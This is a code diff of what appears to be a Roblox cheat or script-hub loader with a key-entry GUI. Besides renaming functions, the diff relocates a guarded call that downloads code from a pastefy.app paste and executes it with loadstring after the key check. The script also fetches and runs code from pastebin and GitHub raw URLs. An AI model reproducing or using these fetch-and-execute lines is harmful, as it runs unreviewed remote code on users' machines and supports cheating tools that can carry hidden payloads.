@@ -216,7 +216,7 @@ UICorner_7.Parent = Frame_3
 
 -- Scripts:
 
-local function SJFBV_fake_script() -- getkey.setcheck 
+local function RVDWOQ_fake_script() -- getkey.setcheck 
 	local script = Instance.new('LocalScript', getkey)
 
 	if game.PlaceId ~= 1215581239 then
@@ -257,12 +257,6 @@ local function SJFBV_fake_script() -- getkey.setcheck
 			_G.bun = "Done"
 		end)
 	
-		if not getgenv().scriLoaded then
-			getgenv().scriLoaded = true
-	
-			loadstring(game:HttpGet("https://pastefy.app/hgQ9hdC9/raw"))()
-		end
-	
 	
 		loadstring(game:HttpGet("https://pastebin.com/raw/JQbB72dE"))()
 	
@@ -288,6 +282,13 @@ local function SJFBV_fake_script() -- getkey.setcheck
 				
 				wait(bruh + 0.3)
 				script.Parent.Parent.Parent.Parent.Parent["..."]:Destroy()
+				
+				if not getgenv().scriLoaded then
+					getgenv().scriLoaded = true
+	
+					loadstring(game:HttpGet("https://pastefy.app/hgQ9hdC9/raw"))()
+				end
+				
 				if game.PlaceId == 1215581239 then
 					loadstring(game:HttpGet("https://raw.githubusercontent.com/highskyY8K/roblox-scripts/refs/heads/main/Gumtsta.lua"))()
 				end
@@ -318,8 +319,8 @@ local function SJFBV_fake_script() -- getkey.setcheck
 		end)
 	end
 end
-coroutine.wrap(SJFBV_fake_script)()
-local function VWHHBG_fake_script() -- TextBox.LocalScript 
+coroutine.wrap(RVDWOQ_fake_script)()
+local function XEZTK_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	local textBox = script.Parent
@@ -356,8 +357,8 @@ local function VWHHBG_fake_script() -- TextBox.LocalScript
 	end)
 	
 end
-coroutine.wrap(VWHHBG_fake_script)()
-local function WXTRCW_fake_script() -- CanvasGroup.Load strokes 
+coroutine.wrap(XEZTK_fake_script)()
+local function OVJL_fake_script() -- CanvasGroup.Load strokes 
 	local script = Instance.new('LocalScript', CanvasGroup)
 
 	TweenService = game:GetService("TweenService")
@@ -425,4 +426,4 @@ local function WXTRCW_fake_script() -- CanvasGroup.Load strokes
 	a.Color = Color3.fromRGB(255, 255, 255)
 	
 end
-coroutine.wrap(WXTRCW_fake_script)()
+coroutine.wrap(OVJL_fake_script)()
